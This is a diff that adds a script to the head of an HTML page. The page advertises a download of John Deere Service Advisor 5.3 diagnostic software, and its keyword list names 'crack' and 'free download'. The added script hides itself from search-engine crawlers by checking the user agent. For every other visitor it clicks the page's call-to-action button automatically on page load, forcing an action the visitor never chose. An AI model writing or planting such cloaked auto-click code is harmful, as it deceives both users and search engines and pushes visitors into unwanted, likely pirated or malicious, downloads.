@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>John Deere Service Advisor 5.3 AG Data 08.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download the latest John Deere Service Advisor 5.3 AG Data 08.2024 for advanced diagnostics and maintenance of John Deere agricultural machinery.">
     <meta name="keywords" content="John Deere Service Advisor 5.3 AG Data 08.2024, John Deere Service Advisor 5.3, John Deere Service Advisor 5.3 download, John Deere Service Advisor 5.3 free download, John Deere Service Advisor 5.3 diagnostic software, John Deere Service Advisor 5.3 crack, John Deere Service Advisor AG Data, John Deere Service Advisor AG Data 08.2024 download, John Deere diagnostic software, John Deere diagnostic software 2024, John Deere repair manual, John Deere Service Advisor repair manual, John Deere AG Data 08.2024, John Deere AG Data 2024 free download, Джон Дир Service Advisor 5.3, Джон Дир Service Advisor 5.3 скачать, Джон Дир Service Advisor 5.3 диагностика, Джон Дир диагностика софт, Джон Дир сервисное руководство, John Deere AG Data 08.2024 download, John Deere AG Data 2024">
     <style>
